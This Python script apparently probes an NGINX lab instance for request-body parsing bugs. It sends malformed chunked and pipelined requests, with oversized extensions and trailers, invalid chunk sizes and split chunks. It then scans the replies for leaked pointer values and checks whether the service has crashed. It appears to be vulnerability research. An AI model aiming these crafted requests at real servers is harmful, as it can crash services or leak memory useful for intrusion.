#!/usr/bin/env python3
"""Remote-only request-body/discard state probe for NGINX 1.31.1.

This targets chunked request-body parsing, discard-body parsing, keepalive
pipelining, and copy-back into the next request header buffer. It observes only
HTTP responses and fresh service health; it does not read files, procfs, logs,
coredumps, debugger state, or container metadata.
"""

from __future__ import annotations

import argparse
import hashlib
import re
import socket
import sys
import time
import urllib.parse
from dataclasses import dataclass


STATUS_RE = re.compile(rb"HTTP/1\.[01] ([0-9]{3})")
HEX_PTR_RE = re.compile(rb"0x[0-9a-fA-F]{10,16}")


@dataclass
class Case:
    name: str
    segments: list[bytes]
    delay: float = 0.0


@dataclass
class Result:
    name: str
    statuses: str
    markers: int
    byte_len: int
    digest: str
    binary_ratio: float
    canonical_words: int
    text_ptrs: int
    closed: str
    health: str
    note: str


def parse_target(value: str, fallback_port: int) -> tuple[str, int]:
    if "://" in value:
        parsed = urllib.parse.urlparse(value)
        return parsed.hostname or "127.0.0.1", parsed.port or fallback_port

    if ":" in value.rsplit("@", 1)[-1]:
        host, port = value.rsplit(":", 1)
        return host, int(port)

    return value, fallback_port


def sha16(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()[:16]


def statuses(data: bytes) -> str:
    found = [match.group(1).decode("ascii") for match in STATUS_RE.finditer(data)]
    return ",".join(found) if found else "-"


def binary_ratio(data: bytes) -> float:
    if not data:
        return 0.0

    allowed = set(range(0x20, 0x7F)) | {0x09, 0x0A, 0x0D}
    return sum(1 for byte in data if byte not in allowed) / len(data)


def canonical_word_count(data: bytes) -> int:
    count = 0
    for index in range(0, max(0, len(data) - 7)):
        value = int.from_bytes(data[index : index + 8], "little")
        if 0x0000550000000000 <= value <= 0x00007FFFFFFFFFFF:
            count += 1
    return count


def send_segments(host: str, port: int, segments: list[bytes], delay: float, timeout: float) -> tuple[bytes, bool, str]:
    chunks: list[bytes] = []
    closed = False

    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)

            for i, segment in enumerate(segments):
                sock.sendall(segment)
                if delay and i != len(segments) - 1:
                    time.sleep(delay)

            while True:
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    return b"".join(chunks), closed, "timeout"

                if not chunk:
                    closed = True
                    break

                chunks.append(chunk)

    except OSError as exc:
        return b"".join(chunks), True, f"{type(exc).__name__}: {exc}"

    return b"".join(chunks), closed, "ok"


def simple_get_request(host_header: str, path: str = "/", connection: str = "close") -> bytes:
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Connection: {connection}\r\n"
        "\r\n"
    ).encode("ascii")


def chunked_request(host_header: str, method: str, path: str, body: bytes, connection: str = "keep-alive") -> bytes:
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Connection: {connection}\r\n"
        "X-Delay: 0\r\n"
        "\r\n"
    ).encode("ascii") + body


def content_length_request(host_header: str, method: str, path: str, length: int, body: bytes) -> bytes:
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Content-Length: {length}\r\n"
        "Connection: keep-alive\r\n"
        "X-Delay: 0\r\n"
        "\r\n"
    ).encode("ascii") + body


def tiny_chunks(count: int, byte: bytes = b"a") -> bytes:
    return b"".join(b"1\r\n" + byte + b"\r\n" for _ in range(count)) + b"0\r\n\r\n"


def medium_chunks(count: int, size: int) -> bytes:
    data = (b"m" * size)
    return b"".join(f"{size:x}\r\n".encode("ascii") + data + b"\r\n" for _ in range(count)) + b"0\r\n\r\n"


def build_cases(host: str, port: int) -> list[Case]:
    host_header = f"{host}:{port}"
    follow = simple_get_request(host_header, "/", "close")
    big_header_follow = (
        b"GET / HTTP/1.1\r\n"
        + f"Host: {host_header}\r\n".encode("ascii")
        + b"X-Follow: "
        + b"F" * 12000
        + b"\r\nConnection: close\r\n\r\n"
    )

    cases: list[Case] = []

    cases.append(Case("discard-chunk-pipe", [chunked_request(host_header, "GET", "/files/pattern.bin", b"5\r\nhello\r\n0\r\n\r\n") + follow]))
    cases.append(Case("discard-many-tiny", [chunked_request(host_header, "GET", "/files/pattern.bin", tiny_chunks(96, b"x")) + follow]))
    cases.append(Case("discard-medium", [chunked_request(host_header, "GET", "/files/pattern.bin", medium_chunks(16, 127)) + follow]))
    cases.append(Case("discard-long-ext", [chunked_request(host_header, "GET", "/files/pattern.bin", b"1;" + b"e" * 8192 + b"\r\nx\r\n0\r\n\r\n") + follow]))
    cases.append(Case("discard-trailer", [chunked_request(host_header, "GET", "/files/pattern.bin", b"1\r\nx\r\n0\r\nX-T: y\r\n\r\n") + follow]))
    cases.append(Case("discard-big-trailer", [chunked_request(host_header, "GET", "/files/pattern.bin", b"1\r\nx\r\n0\r\nX-T: " + b"t" * 8192 + b"\r\n\r\n") + follow]))
    cases.append(Case("discard-invalid", [chunked_request(host_header, "GET", "/files/pattern.bin", b"Z\r\nx\r\n0\r\n\r\n") + follow]))
    cases.append(Case("discard-split-final", [
        chunked_request(host_header, "GET", "/files/pattern.bin", b"1\r\nx\r\n0\r\nX-S: split", "keep-alive"),
        b"\r\n\r\n" + follow,
    ], delay=0.05))
    cases.append(Case("discard-cl-pipe", [content_length_request(host_header, "GET", "/files/pattern.bin", 8, b"A" * 8) + follow]))
    cases.append(Case("discard-cl-big-follow", [content_length_request(host_header, "GET", "/files/pattern.bin", 8, b"B" * 8) + big_header_follow]))

    cases.append(Case("proxy-chunk-pipe", [chunked_request(host_header, "POST", "/spray", b"5\r\nhello\r\n0\r\n\r\n") + follow]))
    cases.append(Case("proxy-many-tiny", [chunked_request(host_header, "POST", "/spray", tiny_chunks(128, b"p")) + follow]))
    cases.append(Case("proxy-medium", [chunked_request(host_header, "POST", "/spray", medium_chunks(32, 64)) + follow]))
    cases.append(Case("proxy-split-final", [
        chunked_request(host_header, "POST", "/spray", b"1\r\nz\r\n0", "keep-alive"),
        b"\r\n\r\n" + follow,
    ], delay=0.05))
    cases.append(Case("proxy-invalid", [chunked_request(host_header, "POST", "/spray", b"10000000000000000\r\nx\r\n0\r\n\r\n") + follow]))

    return cases


def healthy(host: str, port: int, timeout: float) -> bool:
    data, _closed, _note = send_segments(host, port, [simple_get_request(f"{host}:{port}")], 0.0, timeout)
    return b"HTTP/1.1 200" in data and b"poolslip lab ok" in data


def run_case(host: str, port: int, case: Case, timeout: float) -> Result:
    data, closed, note = send_segments(host, port, case.segments, case.delay, timeout)
    time.sleep(0.05)
    health = "up" if healthy(host, port, timeout) else "down"

    return Result(
        name=case.name,
        statuses=statuses(data),
        markers=data.count(b"HTTP/1.1"),
        byte_len=len(data),
        digest=sha16(data),
        binary_ratio=binary_ratio(data),
        canonical_words=canonical_word_count(data),
        text_ptrs=len(HEX_PTR_RE.findall(data)),
        closed="yes" if closed else "no",
        health=health,
        note=note,
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Remote-only NGINX request-body/discard state probe.")
    parser.add_argument("--target", default="127.0.0.1:19331", help="HOST:PORT or URL")
    parser.add_argument("--port", type=int, default=19331)
    parser.add_argument("--timeout", type=float, default=8.0)
    args = parser.parse_args()

    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)

    host, port = parse_target(args.target, args.port)
    print(f"target      {host}:{port}")
    print("scope       remote HTTP only; no file-read/procfs/log/core/debugger inputs")
    print("columns     case statuses markers bytes sha256/16 bin% ptr_words text_ptrs closed health note")

    if not healthy(host, port, args.timeout):
        print("preflight   failed")
        return 2

    suspicious = 0
    for case in build_cases(host, port):
        result = run_case(host, port, case, args.timeout)
        if (
            result.health != "up"
            or result.canonical_words
            or result.text_ptrs
            or result.note not in {"ok", "timeout"}
        ):
            suspicious += 1

        print(
            f"{result.name:<22} {result.statuses:<9} {result.markers:<7} {result.byte_len:<7} "
            f"{result.digest:<16} {result.binary_ratio:<6.3f} "
            f"{result.canonical_words:<9} {result.text_ptrs:<8} "
            f"{result.closed:<6} {result.health:<6} {result.note}"
        )

    print(f"summary     suspicious={suspicious} cases={len(build_cases(host, port))}")
    return 1 if suspicious else 0


if __name__ == "__main__":
    raise SystemExit(main())
